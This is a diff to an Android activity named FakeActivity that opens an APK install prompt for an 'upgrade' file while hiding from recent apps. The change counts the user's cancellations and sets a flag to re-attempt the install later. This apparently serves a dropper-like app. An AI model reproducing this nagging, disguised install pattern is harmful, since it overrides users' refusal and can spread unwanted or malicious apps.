@@ -6,6 +6,8 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.view.Window;
 import android.view.WindowManager;
+import android.widget.Toast;
+import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
 import java.io.File;
@@ -20,6 +22,8 @@ import java.io.File;
 public class FakeActivity extends Activity {
 
     public static final String KEY_PATH = "key_path";
+
+    private static final int REQ_INSTALL = 10001;
 
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -38,7 +42,30 @@ public class FakeActivity extends Activity {
         i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
         i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-        startActivity(i);
+        i.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+        startActivityForResult(i, REQ_INSTALL);
+    }
+
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        if (requestCode == REQ_INSTALL) {
+            if (resultCode == Activity.RESULT_CANCELED) {
+                if (AppRuntime.CANCEL_COUNT < 1) {
+                    AppRuntime.CANCEL_COUNT++;
+
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[FakeActivity::onActivityResult]] Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT);
+//                        Toast.makeText(FakeActivity.this, "Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT, Toast.LENGTH_SHORT).show();
+                    }
+
+                    finish();
+                } else {
+                    SettingManager.getInstance().setCancelInstallReserve(true);
+                    finish();
+                }
+            }
+        }
     }
 
 }
